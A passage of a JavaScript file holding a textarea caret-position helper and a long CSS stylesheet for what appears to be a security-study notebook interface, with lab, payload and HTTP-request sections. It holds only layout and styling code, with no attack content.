      captureBox(function(){ var x = attached.page(); return x && x.vault; }, attached.save, function(){});
    }
    return;
  }
  if(live) active.key(e);
});

// caret position in a textarea, measured with a hidden copy of it
function caretXY(ta, pos){
  var cs = getComputedStyle(ta), d = document.createElement("div");
  ["fontFamily", "fontSize", "fontWeight", "lineHeight", "letterSpacing", "paddingTop", "paddingRight", "paddingBottom", "paddingLeft",
   "borderTopWidth", "borderRightWidth", "borderBottomWidth", "borderLeftWidth", "boxSizing", "width", "tabSize", "textIndent"].forEach(function(k){ d.style[k] = cs[k]; });
  d.style.position = "absolute"; d.style.visibility = "hidden"; d.style.whiteSpace = "pre-wrap"; d.style.wordWrap = "break-word";
  d.style.top = "0"; d.style.left = "-9999px"; d.style.borderStyle = "solid";
  d.textContent = ta.value.slice(0, pos);
  var s = document.createElement("span");
  s.textContent = ta.value.slice(pos) || ".";
  d.appendChild(s);
  document.body.appendChild(d);
  var x = s.offsetLeft, y = s.offsetTop, lh = parseFloat(cs.lineHeight) || parseFloat(cs.fontSize) * 1.5;
  document.body.removeChild(d);
  var r = ta.getBoundingClientRect();
  return { left:r.left + x - ta.scrollLeft, top:r.top + y - ta.scrollTop + lh };
}

// ---------- styles ----------
var css = `
body.vt-wide .wrap{max-width:1240px;}
body.vt-wide.vt-focus .sidebar, body.vt-wide.vt-focus #sbOpen{display:none !important;}
body.vt-wide.vt-focus .main{margin-left:0 !important;}
body.vt-wide.vt-focus .wrap{max-width:1500px;}
.vt{margin-top:.5rem;}
.vt-bar{display:flex; justify-content:space-between; align-items:flex-end; gap:.6rem 1rem; flex-wrap:wrap; border-bottom:2px solid var(--line); margin-bottom:1.4rem;}
.vt-tabs{display:flex; flex-wrap:wrap;}
.vt-tab{background:transparent; border:none; border-bottom:2px solid transparent; margin-bottom:-2px; color:var(--muted); font:inherit; font-size:.68rem;
  letter-spacing:.11em; text-transform:uppercase; padding:.55rem .6rem; cursor:pointer; white-space:nowrap;}
.vt-tab:hover{color:var(--fg);}
.vt-tab.on{color:var(--fg); border-bottom-color:var(--accent);}
.vt-tab.due:not(.on){color:var(--accent);}
.vt-acts{display:flex; gap:.35rem; align-items:center; padding-bottom:.45rem; flex-wrap:wrap;}
.vt-btn{background:transparent; border:2px solid var(--line); color:var(--fg); font:inherit; font-size:.64rem; letter-spacing:.1em; text-transform:uppercase;
  padding:.38rem .65rem; cursor:pointer; white-space:nowrap;}
.vt-btn:hover{border-color:var(--fg);}
.vt-primary{border-color:var(--accent); background:var(--accent); color:var(--accent-ink); font-weight:700;}
.vt-primary:hover{border-color:var(--fg);}
.vt-big{font-size:.76rem; padding:.7rem 1.2rem;}
.vt-link{background:transparent; border:none; color:var(--muted); font:inherit; font-size:.68rem; letter-spacing:.05em; padding:.2rem .3rem; cursor:pointer; text-align:left; text-decoration:none;}
.vt-link:hover, .vt-link.on{color:var(--fg);}
.vt-link.vt-act{color:var(--accent);}
.vt-link.vt-act:hover{color:var(--fg);}
.vt-link.vt-inl{padding:0; font-size:inherit; color:var(--fg); text-decoration:underline; text-decoration-color:var(--accent);}
.vt-link.armed, .vt-x.armed{color:var(--accent); text-transform:uppercase; font-size:.6rem; letter-spacing:.1em;}
.vt-muted{color:var(--muted);}
.vt-small{font-size:.66rem; letter-spacing:.04em;}
.vt-in{background:var(--bg); border:2px solid var(--line); color:var(--fg); font:inherit; font-size:.76rem; padding:.4rem .5rem; outline:none; border-radius:0; color-scheme:dark; min-width:0;}
.vt-in:focus{border-color:var(--accent);}
.vt-in.bad{border-color:var(--accent);}
.vt-sel{cursor:pointer; max-width:15rem; padding:.28rem .35rem; font-size:.68rem;}
.vt-sec{margin-bottom:1.6rem;}
.vt-shead{display:flex; justify-content:space-between; align-items:baseline; gap:1rem; margin-bottom:.55rem;}
.vt-sh{margin:0; font-size:.62rem; font-weight:700; letter-spacing:.14em; text-transform:uppercase; color:var(--muted);}
.vt-sublabel{font-size:.58rem; letter-spacing:.14em; text-transform:uppercase; color:var(--muted); margin:.2rem 0 .35rem;}
.vt-two{display:grid; grid-template-columns:minmax(0, 1fr) minmax(0, 1fr); gap:2rem;}
.vt-stats .count{text-transform:none;}
.vt-stats .right{row-gap:.2rem;}
.vt-empty{border:2px dashed var(--line); padding:1.4rem; display:flex; flex-direction:column; align-items:flex-start; gap:.5rem; font-size:.76rem; color:var(--muted); line-height:1.6;}
.vt-empty b{color:var(--fg); letter-spacing:.1em; text-transform:uppercase; font-size:.72rem;}
.vt-toggle{display:flex; flex-wrap:wrap;}
.vt-tog{background:transparent; border:2px solid var(--line); color:var(--muted); font:inherit; font-size:.58rem; letter-spacing:.1em; text-transform:uppercase; padding:.26rem .5rem; cursor:pointer; white-space:nowrap;}
.vt-tog + .vt-tog{border-left:none;}
.vt-tog:hover{color:var(--fg);}
.vt-tog.on{border-color:var(--accent); background:var(--accent); color:var(--accent-ink);}
.vt-chips{display:flex; flex-wrap:wrap; gap:.3rem; margin:.45rem 0;}
.vt-chip{display:inline-flex; align-items:center; gap:.25rem; background:transparent; border:2px solid var(--line); color:var(--muted); font:inherit; font-size:.62rem; padding:.1rem .4rem; cursor:pointer; letter-spacing:.02em; max-width:100%;}
.vt-chip:hover{color:var(--fg); border-color:var(--muted);}
.vt-chip.on{border-color:var(--accent); color:var(--fg);}
.vt-x{background:transparent; border:none; color:var(--muted); font:inherit; font-size:.85rem; cursor:pointer; padding:0 .1rem; line-height:1;}
.vt-x:hover{color:var(--accent);}
.vt-conf{display:inline-flex; gap:3px; align-items:center;}
.vt-cf{display:inline-block; width:11px; height:11px; border:2px solid var(--line); background:transparent; padding:0; cursor:default;}
button.vt-cf{cursor:pointer;}
button.vt-cf:hover{border-color:var(--fg);}
.vt-cf.on{background:var(--accent); border-color:var(--accent);}
.vt-badge{display:inline-block; font-size:.54rem; letter-spacing:.12em; text-transform:uppercase; padding:.05rem .35rem; border:2px solid var(--line); color:var(--muted); white-space:nowrap; font-weight:400; vertical-align:1px;}
.vt-badge.t-lab{border-color:var(--fg); color:var(--fg);}
.vt-badge.t-payload{border-color:var(--accent); color:var(--accent);}
.vt-badge.t-method{background:var(--line); color:var(--fg);}
.vt-badge.t-capture{border-style:dashed;}
.vt-row-acts{display:flex; align-items:center; gap:.45rem; flex-wrap:wrap; margin-top:.5rem;}
.vt-grow{flex:1 1 auto;}
.vt-pbar{height:8px; border:2px solid var(--line); position:relative; min-width:4rem;}
.vt-pbar i{position:absolute; left:0; top:0; bottom:0; background:var(--accent);}
.vt-pre{margin:0; padding:.6rem .7rem; background:#121212; border:2px solid var(--line); font-size:.72rem; line-height:1.55; overflow:auto; white-space:pre-wrap; word-break:break-all; max-height:24rem; color:#c9c9c9;}

/* home */
.vt-next{list-style:none; margin:0; padding:0; display:flex; flex-direction:column; gap:.15rem;}
.vt-next li{position:relative; padding-left:1.1rem;}
.vt-next li::before{content:"→"; position:absolute; left:0; top:.2rem; color:var(--accent); font-size:.75rem;}
.vt-next .vt-link{color:var(--fg); font-size:.78rem; letter-spacing:0; padding:.2rem 0;}
.vt-next .vt-link:hover{color:var(--accent);}
.vt-wrow, .vt-rrow, .vt-brow{display:flex; align-items:center; gap:.7rem; width:100%; background:transparent; border:none; border-bottom:2px solid var(--line);
  color:var(--fg); font:inherit; font-size:.76rem; padding:.42rem 0; cursor:pointer; text-align:left;}
.vt-wrow:hover, .vt-rrow:hover, .vt-brow:hover{color:var(--accent);}
.vt-static{cursor:default;}
.vt-static:hover{color:var(--fg);}
.vt-wname, .vt-rname{flex:1 1 auto; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-rrow small{color:var(--muted); font-size:.62rem; white-space:nowrap;}
.vt-brow{flex-direction:column; align-items:flex-start; gap:.1rem;}
.vt-brow b{font-size:.76rem;}
.vt-brow small{color:var(--muted); font-size:.63rem; max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-matrix{width:100%;}
.vt-matrix tbody tr{cursor:pointer;}
.vt-matrix tbody tr:hover td{background:#151515;}
.vt-matrix td.num{text-align:right; font-variant-numeric:tabular-nums; width:5rem;}
.vt-matrix th:nth-child(n+2):nth-child(-n+4){text-align:right;}
.vt-matrix td.zero{color:#555;}
.vt-matrix tr.s-done .vt-mname-td, .vt-matrix tr.s-reviewed .vt-mname-td{color:var(--fg);}
.vt-matrix tr.s-todo .vt-mname-td{color:var(--muted);}
.vt-matrix td.vt-flag{color:var(--accent); font-size:.64rem; letter-spacing:.04em; white-space:nowrap;}
.vt-hrow{display:flex; flex-wrap:wrap; align-items:center; gap:.35rem .5rem; border-bottom:2px solid var(--line); padding:.45rem 0; font-size:.74rem;}
.vt-hrow b{font-weight:400; color:var(--fg); margin-right:.3rem;}
.vt-heat{display:flex; gap:3px;}
.vt-hcol{display:flex; flex-direction:column; gap:3px;}
.vt-hc{display:block; width:12px; height:12px; border:2px solid var(--line);}
.vt-hc.l1{background:#5a2021; border-color:#5a2021;}
.vt-hc.l2{background:#9a3133; border-color:#9a3133;}
.vt-hc.l3{background:var(--accent); border-color:var(--accent);}
.vt-hc.lx{border-color:transparent;}

/* library: list + entry */
.vt-lib{display:grid; grid-template-columns:260px minmax(0, 1fr); gap:1.6rem; align-items:start;}
.vt-lib.nolist{grid-template-columns:minmax(0, 1fr);}
.vt-lib.nolist .vt-side{display:none;}
.vt-side{position:sticky; top:1rem; max-height:calc(100vh - 2rem); display:flex; flex-direction:column; min-width:0;}
.vt-filter{width:100%;}
.vt-rows{overflow-y:auto; flex:1 1 auto; margin-top:.3rem; scrollbar-width:thin;}
.vt-grp{font-size:.56rem; letter-spacing:.14em; text-transform:uppercase; color:var(--muted); margin:.9rem 0 .2rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-row{position:relative; display:block; width:100%; border-left:2px solid transparent; color:var(--fg); padding:.35rem .5rem; cursor:pointer; outline:none;}
.vt-row:hover, .vt-row:focus-visible{background:#161616;}
.vt-row.on{border-left-color:var(--accent); background:#171717;}
.vt-rt{display:flex; align-items:center; gap:.35rem; font-size:.75rem; padding-right:2.6rem;}
.vt-rtt{overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-row small{display:block; color:var(--muted); font-size:.6rem; margin-top:.1rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-pin, .vt-revdot, .vt-lst{flex:0 0 auto; display:inline-block; width:7px; height:7px;}
.vt-pin{background:var(--accent);}
.vt-revdot{border:2px solid var(--accent);}
.vt-lst{border:2px solid var(--muted);}
.vt-lst.s-in-progress{border-color:var(--fg);}
.vt-lst.s-solved{background:var(--accent); border-color:var(--accent);}
.vt-lst.s-stuck{border-color:var(--accent);}
.vt-rcopy{position:absolute; right:.2rem; top:.35rem; opacity:0;}
.vt-row:hover .vt-rcopy, .vt-row.on .vt-rcopy, .vt-rcopy.ok{opacity:1;}
.vt-overview-link{display:block; margin:.3rem 0 0; padding:.3rem .5rem; border-left:2px solid transparent; text-transform:uppercase; letter-spacing:.12em; font-size:.6rem;}
.vt-overview-link.on{border-left-color:var(--accent); color:var(--fg);}
.vt-sidefoot{display:flex; gap:.6rem; border-top:2px solid var(--line); margin-top:.6rem; padding-top:.4rem;}
.vt-ed{min-width:0;}
.vt-edbar{display:flex; align-items:center; gap:.5rem; flex-wrap:wrap; margin-bottom:.5rem;}
.vt-back{display:none;}
.vt-title{display:block; width:100%; background:transparent; border:none; outline:none; color:var(--fg); font:inherit; font-size:1.5rem; font-weight:700;
  letter-spacing:.03em; padding:.2rem 0;}
.vt-title::placeholder{color:#444;}
.vt-props{display:flex; flex-direction:column; gap:.35rem; margin:.3rem 0 .8rem;}
.vt-tagsed{display:flex; flex-wrap:wrap; align-items:center; gap:.3rem;}
.vt-tagin{background:transparent; border:none; border-bottom:2px solid transparent; color:var(--fg); font:inherit; font-size:.64rem; width:6rem; padding:.1rem 0; outline:none;}
.vt-tagin:focus{border-bottom-color:var(--accent);}
.vt-tagin::placeholder{color:#555;}
.vt-rels{display:flex; flex-direction:column; gap:.3rem;}
.vt-relrow{display:flex; flex-wrap:wrap; align-items:center; gap:.3rem .4rem; font-size:.7rem;}
.vt-rell{flex:0 0 7.5rem; font-size:.58rem; letter-spacing:.1em; text-transform:uppercase; color:var(--muted);}
.vt-relchip{padding:0 .1rem 0 0; border-color:var(--accent);}
.vt-relgo{background:transparent; border:none; color:var(--fg); font:inherit; font-size:.64rem; padding:.1rem .35rem; cursor:pointer;}
.vt-relgo:hover{color:var(--accent);}
.vt-reladd .vt-rell{color:#555;}
.vt-reladd .vt-in{font-size:.66rem; padding:.2rem .35rem;}
.vt-relin{flex:1 1 12rem; max-width:22rem;}
.vt-conrow{display:flex; flex-wrap:wrap; align-items:center; gap:.35rem .4rem; font-size:.7rem;}
.vt-relkind{background:transparent; border:none; border-right:2px solid var(--line); color:var(--accent); font:inherit; font-size:.56rem; letter-spacing:.06em;
  text-transform:uppercase; padding:.1rem .35rem; cursor:pointer;}
.vt-relkind:hover{color:var(--fg);}
.vt-connect{padding:.18rem .55rem; font-size:.6rem; border-color:var(--accent); color:var(--fg);}
.vt-sugchip{border-style:dashed;}
.vt-sugchip:hover{border-style:solid; border-color:var(--accent); color:var(--fg);}
.vt-pickmenu{width:min(360px, calc(100vw - 16px)); max-width:none; padding:.4rem;}
.vt-pickin{width:100%; margin-bottom:.3rem;}
.vt-picklist{max-height:18rem; overflow-y:auto;}
.vt-pick{display:flex; align-items:center; gap:.4rem;}
.vt-pick.on{background:var(--accent); color:var(--accent-ink);}
.vt-pick.on .vt-badge{border-color:var(--accent-ink); color:var(--accent-ink); background:transparent;}
.vt-mhead{font-size:.6rem; letter-spacing:.1em; text-transform:uppercase; color:var(--muted); padding:.45rem .6rem .3rem; white-space:normal;}
.vt-mi.on{box-shadow:inset 3px 0 0 var(--accent);}
.vt-tplrow{display:flex; flex-wrap:wrap; align-items:center; gap:.35rem .4rem; margin:0 0 .7rem; padding:.5rem .6rem; border:2px dashed var(--line);}
.vt-tplrow .vt-chip{color:var(--fg);}
.vt-tplrow .vt-chip:hover{border-color:var(--accent);}
.vt-gfind{flex:0 1 14rem; font-size:.7rem; padding:.28rem .45rem;}
.vt-more{padding-left:.2rem; border-left:2px solid var(--line);}
.vt-glegend{display:flex; flex-wrap:wrap; gap:.4rem 1.1rem; align-items:center; margin-top:.55rem; font-size:.62rem; color:var(--muted);}
.vt-glegend > span{display:inline-flex; align-items:center; gap:.4rem;}
.vt-sw.k-ghost{background:transparent; border:2px dashed var(--muted);}
.vt-sw.e-rel, .vt-sw.e-link{width:16px;}
.vt-fields{display:grid; grid-template-columns:repeat(4, minmax(0, 1fr)); gap:.6rem; margin-bottom:.8rem;}
.vt-field{display:flex; flex-direction:column; gap:.25rem; font-size:.56rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted); min-width:0;}
.vt-field.wide{grid-column:1 / -1;}
.vt-field .vt-in{text-transform:none; letter-spacing:0;}
.vt-urlrow{display:flex; gap:.4rem; align-items:center;}
.vt-urlrow .vt-in{flex:1 1 auto;}
.vt-target{display:flex; flex-wrap:wrap; align-items:center; gap:.35rem .8rem; border:2px solid var(--line); padding:.35rem .6rem; margin-bottom:.8rem;}
.vt-tlabel{font-size:.58rem; letter-spacing:.14em; text-transform:uppercase; color:var(--accent); font-weight:700;}
.vt-tvar{display:inline-flex; align-items:center; gap:.3rem; font-size:.6rem; letter-spacing:.08em; color:var(--muted);}
.vt-tin{background:transparent; border:none; border-bottom:2px solid var(--line); color:var(--fg); font:inherit; font-size:.72rem; padding:.1rem .1rem; outline:none; min-width:5ch; max-width:22ch;}
.vt-tin:focus{border-bottom-color:var(--accent);}
.vt-tin::placeholder{color:#444;}
.vt-panes{display:grid; gap:1.2rem; align-items:start;}
.vt-panes.m-split{grid-template-columns:minmax(0, 1fr) minmax(0, 1fr);}
.vt-panes.m-edit .vt-prev{display:none;}
.vt-panes.m-read .vt-ta{display:none;}
.vt-ta{display:block; width:100%; resize:none; overflow:hidden; background:transparent; border:2px solid var(--line); outline:none; color:var(--fg);
  font:inherit; font-size:.8rem; line-height:1.65; padding:.8rem .9rem; tab-size:2; border-radius:0;}
.vt-ta:focus{border-color:#444;}
.vt-ta::placeholder{color:#4a4a4a;}
.vt-prev{min-width:0; padding:.2rem .1rem;}
.vt-panes.m-split .vt-prev{border-left:2px solid var(--line); padding-left:1.2rem;}
.vt-foot{margin-top:.6rem; font-size:.62rem; color:var(--muted); letter-spacing:.04em;}
.vt-conn{margin-top:1.6rem;}
.vt-chain{display:flex; flex-wrap:wrap; align-items:center; gap:.4rem; font-size:.78rem;}
.vt-chain > span{display:inline-flex; align-items:center; gap:.4rem;}
.vt-arrow{font-style:normal; color:var(--accent);}
.vt-chainme{border:2px solid var(--accent); padding:.15rem .5rem;}
.vt-chainlink{background:transparent; border:2px solid var(--line); color:var(--fg); font:inherit; font-size:.76rem; padding:.15rem .5rem; cursor:pointer;}
.vt-chainlink:hover{border-color:var(--fg);}
.vt-sugrow{display:flex; align-items:center; gap:.5rem;}
.vt-sugrow .vt-brow{flex:1 1 auto; min-width:0;}
.vt-code-in{width:100%; min-height:90px; resize:none; overflow:hidden; font-size:.8rem; line-height:1.6; background:#121212; tab-size:2;}
.vt-paycode{margin:.2rem 0 1rem;}
.vt-mgrid{display:grid; grid-template-columns:repeat(auto-fill, minmax(230px, 1fr)); gap:.8rem;}
.vt-mcard{display:flex; flex-direction:column; align-items:flex-start; gap:.3rem; background:transparent; border:2px solid var(--line); color:var(--fg); font:inherit; text-align:left; padding:.8rem .9rem; cursor:pointer;}
.vt-mcard:hover{border-color:var(--fg);}
.vt-mcard b{font-size:.8rem;}
.vt-mcard small{font-size:.62rem; color:var(--muted);}
.vt-mrun{width:100%; display:flex; flex-direction:column; gap:.3rem; font-size:.64rem; color:var(--muted); margin-top:.3rem;}
.vt-runbar{display:flex; flex-wrap:wrap; align-items:center; gap:.5rem .7rem; border:2px solid var(--line); padding:.45rem .6rem; margin-bottom:.8rem;}
.vt-runbar.on{border-color:var(--accent);}
.vt-runbar .vt-in{font-size:.7rem; padding:.25rem .4rem;}
.vt-runprog{display:flex; align-items:center; gap:.5rem; font-size:.66rem; color:var(--fg); flex:1 1 12rem;}
.vt-runprog .vt-pbar{flex:1 1 auto;}
.vt-ars{display:flex; flex-direction:column; gap:.4rem;}
.vt-arsh{display:flex; align-items:baseline; gap:.8rem; font-size:.74rem; margin-bottom:.3rem;}
.vt-arsh b{overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-arsh .vt-link{white-space:nowrap; margin-left:auto;}
.vt-ardesc{font-size:.72rem; color:#bdbdbd; margin:-.4rem 0 .6rem;}
.vt-arsi{margin-bottom:.4rem;}
.vt-filters{display:flex; flex-wrap:wrap; gap:.5rem .8rem; align-items:center; margin-bottom:.8rem;}
.vt-filters .vt-filter{flex:1 1 14rem; max-width:24rem;}
.vt-opt{display:inline-flex; align-items:center; gap:.35rem; font-size:.64rem; letter-spacing:.04em; color:var(--muted); cursor:pointer; white-space:nowrap;}
.vt-opt input{accent-color:var(--accent);}
.vt-sw{display:inline-block; width:9px; height:9px; background:var(--fg);}
.vt-sw.k-lab{background:transparent; border:2px solid var(--fg);}
.vt-sw.k-payload{background:var(--accent);}
.vt-sw.k-http, .vt-sw.k-capture, .vt-sw.k-tag{background:var(--muted);}
.vt-sw.k-method{transform:rotate(45deg) scale(.85);}
.vt-sw.k-mod{background:transparent; border:2px solid var(--accent);}
.vt-sw.e-link{height:2px; background:var(--muted);}
.vt-sw.e-rel{height:2px; background:var(--accent);}

/* labs */
.vt-labs{width:100%;}
.vt-labs tbody tr{cursor:pointer;}
.vt-labs tbody tr:hover td{background:#151515;}
.vt-labs tr.s-solved .vt-lstat{color:var(--accent);}
.vt-labs tr.s-stuck .vt-lstat{color:var(--accent); font-weight:700;}
.vt-labs tr.s-todo td{color:var(--muted);}

/* http */
.vt-paste{width:100%; font-size:.76rem; line-height:1.55; resize:vertical;}
.vt-rawgrid{display:grid; grid-template-columns:minmax(0, 1fr) minmax(0, 1fr); gap:.8rem; margin-bottom:.8rem;}
.vt-raw{width:100%; min-height:13rem; resize:vertical; font-size:.72rem; line-height:1.55; background:#121212; white-space:pre; overflow:auto;}
.vt-http{margin-bottom:1rem;}
.vt-hsum{font-size:.82rem; margin-bottom:1rem; padding:.5rem .7rem; border-left:4px solid var(--accent); background:#141414; word-break:break-all;}
.vt-hmeth{color:var(--accent);}
.vt-hstat{color:var(--fg); font-weight:700;}
.vt-hstat.bad{color:var(--accent);}
.vt-finds{list-style:none; margin:0; padding:0; display:flex; flex-direction:column; gap:.3rem;}
.vt-finds li{display:flex; gap:.7rem; align-items:baseline; font-size:.74rem; line-height:1.5; padding:.3rem .5rem; border:2px solid var(--line);}
.vt-finds li b{flex:0 0 3.2rem; font-size:.56rem; letter-spacing:.12em; text-transform:uppercase; color:var(--muted);}
.vt-finds li.f-lead{border-color:var(--accent);}
.vt-finds li.f-lead b{color:var(--accent);}
.vt-finds li.f-warn b{color:var(--fg);}
.vt-htable{width:100%;}
.vt-htable td{word-break:break-all;}
.vt-htable td.vt-hk{color:var(--fg); font-weight:700; white-space:nowrap; word-break:normal;}
.vt-htable tr.f-lead td:first-child, .vt-htable tr.f-warn td:first-child{box-shadow:inset 3px 0 0 var(--accent);}
.vt-htable td:last-child{width:30%; min-width:9rem;}
.vt-bad{color:var(--accent);}
.vt-ann{width:100%; background:transparent; border:none; border-bottom:2px solid transparent; color:var(--fg); font:inherit; font-size:.7rem; padding:.1rem 0; outline:none;}
.vt-ann:hover{border-bottom-color:var(--line);}
.vt-ann:focus{border-bottom-color:var(--accent);}
.vt-ann::placeholder{color:#444;}
.vt-body-pre{max-height:18rem;}

/* rendered markdown */
.vt-md{font-size:.82rem; line-height:1.7; overflow-wrap:anywhere;}
.vt-md p{margin:0 0 .8rem;}
.vt-md .vt-h{margin:1.3rem 0 .5rem; line-height:1.3; letter-spacing:.03em;}
.vt-md .vt-h:first-child{margin-top:0;}
.vt-md .vt-h1{font-size:1.25rem;}
.vt-md .vt-h2{font-size:1rem; border-bottom:2px solid var(--line); padding-bottom:.25rem;}
.vt-md .vt-h3{font-size:.86rem;}
.vt-md .vt-h4{font-size:.74rem; text-transform:uppercase; letter-spacing:.12em; color:var(--muted);}
.vt-md hr{border:none; border-top:2px solid var(--line); margin:1.2rem 0;}
.vt-md strong{color:#fff;}
.vt-md mark{background:var(--accent); color:var(--accent-ink); padding:0 .15rem;}
.vt-md del{color:var(--muted);}
.vt-md blockquote{margin:0 0 .8rem; border-left:2px solid var(--muted); padding:.1rem 0 .1rem .9rem; color:#c2c2c2;}
.vt-md a{color:var(--fg); text-decoration:underline; text-decoration-color:var(--muted); text-underline-offset:3px;}
.vt-md a:hover{text-decoration-color:var(--accent);}
.vt-fig{display:block; margin:.3rem 0 .9rem;}
.vt-img{display:block; max-width:100%; height:auto; border:2px solid var(--line); cursor:zoom-in;}
.vt-figcap{display:block; margin-top:.3rem; font-size:.66rem; letter-spacing:.04em; color:var(--muted);}
.vt-figcap::before{content:"▲ "; color:var(--accent); font-size:.55rem;}
.vt-shotbar{display:flex; flex-wrap:wrap; align-items:center; gap:.4rem .8rem; margin:0 0 .55rem;}
.vt-shotbtn{border-color:var(--accent);}
.vt-panes.vt-dropping{outline:2px dashed var(--accent); outline-offset:4px;}
.vt-gallery{margin-top:1rem;}
.vt-thumbs{display:grid; grid-template-columns:repeat(auto-fill, minmax(150px, 1fr)); gap:.6rem;}
.vt-thumb{position:relative; margin:0; border:2px solid var(--line); background:#121212; min-width:0;}
.vt-thumb:hover{border-color:var(--fg);}
.vt-thumbimg{display:block; width:100%; padding:0; border:none; background:transparent; cursor:zoom-in;}
.vt-thumbimg img{display:block; width:100%; height:96px; object-fit:cover; object-position:top left;}
.vt-thumb figcaption{font-size:.6rem; color:var(--muted); padding:.25rem .4rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; border-top:2px solid var(--line);}
.vt-thumbx{position:absolute; top:.15rem; right:.2rem; background:var(--bg); padding:0 .3rem; opacity:0;}
.vt-thumb:hover .vt-thumbx, .vt-thumbx:focus, .vt-thumbx.armed{opacity:1;}
.vt-imgmiss{color:var(--accent); font-size:.7rem;}
.vt-wl{text-decoration-color:var(--accent) !important;}
.vt-wl.missing{color:var(--muted) !important; text-decoration-style:dashed !important;}
.vt-tag{text-decoration:none !important; color:var(--accent) !important; font-size:.92em;}
.vt-ic{font-family:inherit; font-size:.92em; background:#1b1b1b; border:1px solid var(--line); padding:0 .3rem;}
.vt-ph{background:transparent; color:var(--fg); border-bottom:2px solid var(--accent); padding:0 .1rem;}
.vt-ph.empty{color:var(--accent); border-bottom-style:dashed;}
.vt-list{margin:0 0 .8rem;}
.vt-li{display:flex; align-items:flex-start; gap:.55rem; padding-left:calc(var(--lv) * 1.3rem); margin:.15rem 0;}
.vt-lc{flex:1 1 auto; min-width:0;}
.vt-li.done > .vt-lc{color:var(--muted); text-decoration:line-through; text-decoration-color:var(--accent);}
.vt-dot{flex:0 0 auto; width:6px; height:6px; background:var(--muted); margin-top:.62em;}
.vt-num{flex:0 0 auto; color:var(--muted); min-width:1.2rem;}
.vt-chk{flex:0 0 auto; width:15px; height:15px; margin-top:.3em; border:2px solid var(--fg); background:transparent; padding:0; cursor:pointer; position:relative;}
.vt-chk.on{background:var(--accent); border-color:var(--accent);}
.vt-chk.on::after{content:""; position:absolute; left:3px; top:0; width:4px; height:8px; border:solid var(--accent-ink); border-width:0 2px 2px 0; transform:rotate(45deg);}
.vt-co{border:2px solid var(--line); border-left-width:4px; padding:.55rem .8rem .1rem; margin:0 0 .9rem;}
.vt-co p{font-size:.78rem;}
.vt-co-t{font-size:.64rem; font-weight:700; letter-spacing:.12em; text-transform:uppercase; margin-bottom:.35rem;}
.vt-co-tip{border-left-color:var(--fg);}
.vt-co-warn{border-left-color:var(--accent);}
.vt-co-warn .vt-co-t{color:var(--accent);}
.vt-co-note{border-left-color:var(--muted);}
.vt-co-note .vt-co-t{color:var(--muted);}
.vt-twrap{overflow-x:auto; margin:0 0 .9rem;}
.vt-table{border-collapse:collapse; font-size:.74rem; min-width:50%;}
.vt-table th{text-align:left; border-bottom:2px solid var(--fg); padding:.35rem .55rem; font-size:.58rem; letter-spacing:.1em; text-transform:uppercase; color:var(--muted); font-weight:400; white-space:nowrap;}
.vt-table td{border-bottom:2px solid var(--line); padding:.38rem .55rem; vertical-align:top;}
.vt-code{border:2px solid var(--line); margin:0 0 .9rem; background:#121212;}
.vt-code-h{display:flex; align-items:center; gap:.6rem; border-bottom:2px solid var(--line); padding:.2rem .2rem .2rem .6rem; font-size:.6rem; letter-spacing:.1em; color:var(--muted);}
.vt-lang{text-transform:uppercase; color:var(--accent); font-weight:700;}
.vt-code-t{flex:1 1 auto; min-width:0; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; letter-spacing:.04em;}
.vt-copy{margin-left:auto; background:transparent; border:2px solid transparent; color:var(--muted); font:inherit; font-size:.6rem; letter-spacing:.1em; text-transform:uppercase; padding:.12rem .5rem; cursor:pointer;}
.vt-copy:hover{color:var(--fg); border-color:var(--line);}
.vt-copy.ok{color:var(--accent-ink); background:var(--accent);}
.vt-code pre{margin:0; padding:.7rem .8rem; overflow-x:auto; font-size:.78rem; line-height:1.6; color:#bdbdbd; scrollbar-width:thin;}
.vt-code code{font-family:inherit; white-space:pre;}
.hl-c{color:#6c6c6c; font-style:italic;}
.hl-s{color:#e2e2e2;}
.hl-k{color:var(--accent);}
.hl-x{color:#fff; font-weight:700;}
.hl-f{color:#9a9a9a;}
.hl-v{color:var(--accent);}
.hl-n{color:#fff;}
.hl-a{color:#d6d6d6; font-weight:700;}
.vt-fc{border:2px solid var(--line); border-left:4px solid var(--accent); display:grid; grid-template-columns:1fr auto; gap:.15rem .8rem; padding:.45rem .7rem; margin:0 0 .6rem;}
.vt-fq{font-weight:700;}
.vt-fa{grid-column:1; color:#bdbdbd;}
.vt-fs{grid-column:2; grid-row:1; font-size:.56rem; letter-spacing:.1em; text-transform:uppercase; color:var(--muted); white-space:nowrap;}
.vt-fs.due{color:var(--accent);}
.vt-lc .vt-fc{margin:0;}

/* popovers */
.vt-ac, .vt-menu{position:fixed; z-index:300; background:var(--bg); border:2px solid var(--fg); box-shadow:6px 6px 0 var(--line); min-width:220px; max-width:340px;}
.vt-aci, .vt-mi{display:block; width:100%; background:transparent; border:none; color:var(--fg); font:inherit; font-size:.74rem; text-align:left; padding:.4rem .6rem; cursor:pointer;
  overflow:hidden; text-overflow:ellipsis; white-space:nowrap;}
.vt-aci small{color:var(--muted); font-size:.6rem;}
.vt-aci.on, .vt-aci:hover, .vt-mi:hover{background:var(--accent); color:var(--accent-ink);}
.vt-aci.on small, .vt-aci:hover small{color:var(--accent-ink);}
.vt-mi b{display:block; font-size:.74rem;}
.vt-mi small{display:block; font-size:.62rem; color:var(--muted); white-space:normal;}
.vt-mi:hover small{color:var(--accent-ink);}
.vt-keys{padding:.5rem .7rem; display:flex; flex-direction:column; gap:.3rem; font-size:.7rem;}
.vt-keys div{display:flex; gap:.8rem; align-items:baseline;}
.vt-keys kbd{flex:0 0 7.5rem; font-family:inherit; font-size:.64rem; color:var(--accent);}
.vt-palback{position:fixed; inset:0; z-index:400; background:rgba(0,0,0,.6); display:flex; justify-content:center; align-items:flex-start; padding-top:12vh;}
.vt-pal{width:min(680px, calc(100vw - 2rem)); background:var(--bg); border:2px solid var(--fg); box-shadow:8px 8px 0 var(--accent);}
.vt-pin-in{display:block; width:100%; background:transparent; border:none; border-bottom:2px solid var(--line); color:var(--fg); font:inherit; font-size:.92rem; padding:.9rem 1rem; outline:none;}
